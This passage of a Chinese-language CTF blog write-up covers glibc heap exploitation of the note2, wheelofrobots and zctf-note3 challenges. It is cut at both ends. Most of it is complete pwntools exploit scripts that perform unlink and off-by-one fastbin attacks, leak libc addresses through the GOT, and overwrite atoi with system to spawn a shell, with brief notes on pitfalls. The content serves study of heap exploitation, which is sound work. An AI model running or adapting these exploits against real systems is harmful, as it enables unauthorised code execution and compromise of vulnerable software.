class="code"><pre><span class="line">ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">first()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure><p>getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, choice, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Input your name:\n"</span>, <span class="string">"NoOne-hub"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your address:\n"</span>, <span class="string">"NoOne-hub"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">    first()</span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">    shownote(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">    atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">    libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get_shell</span></span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p>这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来</p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解<i class="fa fa-external-link"></i></span></p><p>我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑</p><h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>准备部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br></pre></td></tr></table></figure><p><strong>注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址</strong></p><ol start="2"><li>off-by-one溢出修改部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line"><span class="comment"># change fd pointer</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line"><span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#whell &lt;=2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>我觉得这部分应该是顺风顺水的吧，off-by-one学过了</p><ol start="3"><li>关键点</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment">#change idx6 size:1000</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了</p><ol start="4"><li>修改并泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change robot_wheel to 3</span></span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">start_robot()</span><br><span class="line"><span class="comment"># leak </span></span><br><span class="line">io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><p>我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写<br>写入完后泄露</p><ol start="5"><li>getshell了</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">io.send(<span class="string">"sh;#"</span>)</span><br></pre></td></tr></table></figure><p>跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'wheelofrobots'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'wheelofrobots'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change fd pointer</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">    off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line">    <span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#whell &lt;=2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment">#change idx6 size:1000</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">    payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change robot_wheel to 3</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    <span class="comment"># leak </span></span><br><span class="line">    io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">    puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">    io.send(<span class="string">"sh;#"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="zctf-note3"><a href="#zctf-note3" class="headerlink" title="zctf-note3"></a>zctf-note3</h2><p>这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案</p><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><p>有增删查改，<br>查询部分是没用的，无法泄露</p><h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>不知道为什么，看到这个读取函数瞬间就懂怎么做了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a2-1跟我前面做过的一两道题都类似，利用0-1负数，然后转成无符号比较，变成很大，也就是堆溢出</p><p><strong>注意：这里的坑点就是a3, a3假设被定为\n，我们sendline的时候sendline(p64(addr))会覆盖到下一个地址的最后一位，并将他改成\x00，这是最坑的点了，我被这个坑了好久</strong></p><h3 id="漏洞利用过程-3"><a href="#漏洞利用过程-3" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>准备工作</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br></pre></td></tr></table></figure><p>不用多说吧，每道堆题一样的套路</p><ol start="2"><li>unlink部分</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">delete(<span 